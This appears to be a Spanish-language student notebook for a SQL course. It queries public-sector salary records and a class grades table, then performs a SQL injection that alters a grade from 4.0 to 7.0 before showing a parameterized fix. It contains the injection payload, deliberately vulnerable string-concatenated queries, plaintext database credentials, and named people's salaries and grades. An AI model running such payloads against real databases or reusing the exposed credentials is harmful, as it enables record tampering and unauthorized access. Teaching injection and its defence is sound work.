# %%
# !apt install postgresql postgresql-contrib &>log
# !service postgresql start
# !sudo -u postgres psql -c "CREATE USER root WITH SUPERUSER"
# !pip install pgspecial
# Out:
#  * Starting PostgreSQL 14 database server
#    ...done.
# CREATE ROLE
# ...
#      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.5/171.5 kB 7.6 MB/s eta 0:00:00
# ...

# %%
# %load_ext sql
# %config SqlMagic.feedback=False
# %config SqlMagic.autopandas=True
# %sql postgresql+psycopg2://diplo:diplo_python@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes

# %%
import psycopg2
import pandas as pd

# %%
db_dict = {
    'host': 'lin-29996-12677-pgsql-primary.servers.linodedb.net',
    'database': 'viajes',
    'user': 'diplo',
    'password': 'diplo_python',
    'port': '5432'
}
conn = psycopg2.connect(**db_dict)

# %%
#Exploramos la base de datos
# %%sql
SELECT *
FROM transparencia
LIMIT 3;
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#    anho  mes                  nombres apellidop apellidom          estudios  \
# 0  2015    1         Laura Del Carmen   Aballay   Garrido  SIN INFORMACIÃN
# 1  2015    1  Francisco Javier Leonel     Abalo       Cea         MAGÃSTER
# 2  2015    1         Isabel Margarita    Abarca     Baeza         MAGÃSTER
#
#   fecha_inicio   fecha_fin                                           programa  \
# 0   2011-09-01  2015-12-31                Programa AcadÃ©mico de Bachillerato
# 1   2008-02-01  2015-12-31               Facultad de FilosofÃ­a y Humanidades
# 2   2015-01-01  2015-12-31  Instituto de NutriciÃ³n y TecnologÃ­a de los A...
#
#     regimen       cargo         cargo2 grado   monto
# 0  CONTRATA    AUXILIAR       AUXILIAR    24  667712
# 1  CONTRATA  ACADÃMICO     INSTRUCTOR    10  575249
# 2  CONTRATA  ACADÃMICO  PROF. ADJUNTO     9   93453

# %%
#P0. Escriba una consulta SQL para obtener los salarios mensuales de todos los empleados que tengan un apellido
#paterno elegido por usted, ordenados por monto.
#Elegí imprimir más datos que sólo el monto
# %%sql
SELECT nombres, apellidop, apellidom, monto
FROM transparencia
WHERE apellidop LIKE '%Verdugo%'
ORDER BY monto
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#                nombres apellidop apellidom    monto
# 0      Alejandro Isaac   Verdugo     Palma    73217
# 1      Alejandro Isaac   Verdugo     Palma    73217
# 2      Alejandro Isaac   Verdugo     Palma    73217
# 3      Alejandro Isaac   Verdugo     Palma    73217
# 4      Alejandro Isaac   Verdugo     Palma    73217
# ..                 ...       ...       ...      ...
# 522  Ricardo Alejandro   Verdugo   Salgado  3012247
# 523  Ricardo Alejandro   Verdugo   Salgado  3044247
# 524  Ricardo Alejandro   Verdugo   Salgado  3509381
# 525  Ricardo Alejandro   Verdugo   Salgado  3757678
# 526  Ricardo Alejandro   Verdugo   Salgado  3884951
#
# [527 rows x 4 columns]

# %%
#Exploramos la base de datos
# %%sql
SELECT *
FROM notas
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#     id                                           nombre  nota
# 0    4  Quijada Mateluna, Francisca Victoria del Carmen   5.1
# 1    5             Martinez Garrido, Gabriela Alejandra   4.7
# 2    6                      Filippini Puttini, Giuliano   5.5
# 3    7                Calderon Leiva, Gonzalo Sebastian   4.9
# 4    8                   Valdes Rubilar, Gustavo Arturo   3.3
# 5    9           Villarroel Ramirez, Jenifer Del Carmen   6.2
# 6   10               Gascon Pérez, Militza Angela Lucia   5.3
# 7    2              Hermosilla Varela, Dominique Isabel   6.2
# 8    3                    Cotoras Straub, Dusan Alfredo   3.6
# 9    1              Mancilla Almonacid, Daniela Francis   4.0
# 10  11                  Vucina Martinez, Miroslav Mario   7.0

# %%
#P0. Escriba una consulta SQL que obtenga su nota final del ramo.
# %%sql
SELECT nota
FROM notas
WHERE nombre LIKE '%Mancilla%'
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#    nota
# 0   4.0

# %%
#P1. Escriba un código que pida un apellido usando input().
#Genere una query que entregue los diez sueldos más altos de empleados con ese apellido.
#Escogí Leon
apellido=input()
query= "SELECT nombres, apellidop, apellidom, monto FROM transparencia WHERE apellidop = '"+apellido+"' ORDER BY monto DESC LIMIT 10"
pd.read_sql_query(query,conn)
# Out:
# Leon
# <ipython-input-9-e459ad2cfc54>:6: UserWarning: pandas only supports SQLAlchemy connectable (engine/connection) or database string URI or sqlite3 DBAPI2 connection. Other DBAPI2 objects are not tested. Please consider using SQLAlchemy.
#   pd.read_sql_query(query,conn)
#             nombres apellidop apellidom    monto
# 0  Patricio Rodrigo      Leon      Diaz  5693828
# 1         Alejandro      Leon   Stewart  5115987
# 2     Boris Marcial      Leon     Rocha  4990419
# 3         Alejandro      Leon   Stewart  4735402
# 4         Alejandro      Leon   Stewart  4687602
# 5         Alejandro      Leon   Stewart  4671287
# 6         Alejandro      Leon   Stewart  4610602
# 7         Alejandro      Leon   Stewart  4455259
# 8         Alejandro      Leon   Stewart  4348603
# 9         Alejandro      Leon   Stewart  4044489

# %%
#P2. Usted debe ejecutar la celda e ingresar un ataque de SQL injection para subir su nota registrada en notas.

# %%
#SIN ATAQUE ingresar Mancilla
apellido=input()
query= "SELECT nota FROM notas WHERE nombre LIKE '%"+apellido+"%'"
pd.read_sql_query(query,conn)
# Out:
# Mancilla
# <ipython-input-10-6b334e521346>:4: UserWarning: pandas only supports SQLAlchemy connectable (engine/connection) or database string URI or sqlite3 DBAPI2 connection. Other DBAPI2 objects are not tested. Please consider using SQLAlchemy.
#   pd.read_sql_query(query,conn)
#    nota
# 0   4.0

# %%
conn.commit()

# %%
#Verificamos que no cambió
# %%sql
SELECT nota
FROM notas
WHERE nombre LIKE '%Mancilla%'
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#    nota
# 0   4.0

# %%
#CON ATAQUE ingresar Mancilla%'; UPDATE notas SET nota = '7.0' WHERE nombre LIKE '%Mancilla%' --
apellido=input()
query= "SELECT nota FROM notas WHERE nombre LIKE '%"+apellido+"%'"
pd.read_sql_query(query,conn)
# Out:
# Mancilla%'; UPDATE notas SET nota = '7.0' WHERE nombre LIKE '%Mancilla%' --
# <ipython-input-13-2ae52718b39a>:4: UserWarning: pandas only supports SQLAlchemy connectable (engine/connection) or database string URI or sqlite3 DBAPI2 connection. Other DBAPI2 objects are not tested. Please consider using SQLAlchemy.
#   pd.read_sql_query(query,conn)
# ---------------------------------------------------------------------------
# TypeError                                 Traceback (most recent call last)
# <ipython-input-13-2ae52718b39a> in <cell line: 4>()
#       2 apellido=input()
#       3 query= "SELECT nota FROM notas WHERE nombre LIKE '%"+apellido+"%'"
# ----> 4 pd.read_sql_query(query,conn)
#
# /usr/local/lib/python3.10/dist-packages/pandas/io/sql.py in read_sql_query(sql, con, index_col, coerce_float, params, parse_dates, chunksize, dtype)
#     395     """
#     396     pandas_sql = pandasSQL_builder(con)
# --> 397     return pandas_sql.read_query(
#     398         sql,
# ...

# %%
conn.commit()

# %%
#Verifiquemos que cambió
# %%sql
SELECT nota
FROM notas
WHERE nombre LIKE '%Mancilla%'
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#    nota
# 0   7.0

# %%
#P3. En otra celda, escriba la misma funcionalidad, pero esta vez, de forma segura ante SQL
#injections. Pruebe que al re-ingresar la inyección del problema anterior, esta vez su nota no cambia.

# %%
#SIN ATAQUE ingresar Mancilla
apellido=input()
query= "SELECT nota FROM notas WHERE nombre LIKE %s"
pd.read_sql_query(query,conn,params=['%'+apellido+'%'])
# Out:
# Mancilla
# <ipython-input-16-914acd35ec3f>:4: UserWarning: pandas only supports SQLAlchemy connectable (engine/connection) or database string URI or sqlite3 DBAPI2 connection. Other DBAPI2 objects are not tested. Please consider using SQLAlchemy.
#   pd.read_sql_query(query,conn,params=['%'+apellido+'%'])
#    nota
# 0   7.0

# %%
conn.commit()

# %%
#CON ATAQUE ingresar Mancilla%'; UPDATE notas SET nota = '1.0' WHERE nombre LIKE '%Mancilla%' --
apellido=input()
query= "SELECT nota FROM notas WHERE nombre LIKE %s"
pd.read_sql_query(query,conn,params=['%'+apellido+'%'])
# Out:
# Mancilla%'; UPDATE notas SET nota = '1.0' WHERE nombre LIKE '%Mancilla%' --
# <ipython-input-20-981e2f43891a>:4: UserWarning: pandas only supports SQLAlchemy connectable (engine/connection) or database string URI or sqlite3 DBAPI2 connection. Other DBAPI2 objects are not tested. Please consider using SQLAlchemy.
#   pd.read_sql_query(query,conn,params=['%'+apellido+'%'])
# Empty DataFrame
# Columns: [nota]
# Index: []

# %%
conn.commit()

# %%
#Verificamos que no cambió
# %%sql
SELECT nota
FROM notas
WHERE nombre LIKE '%Mancilla%'
# Out:
#  * postgresql+psycopg2://diplo:***@lin-29996-12677-pgsql-primary.servers.linodedb.net:5432/viajes
#    nota
# 0   7.0
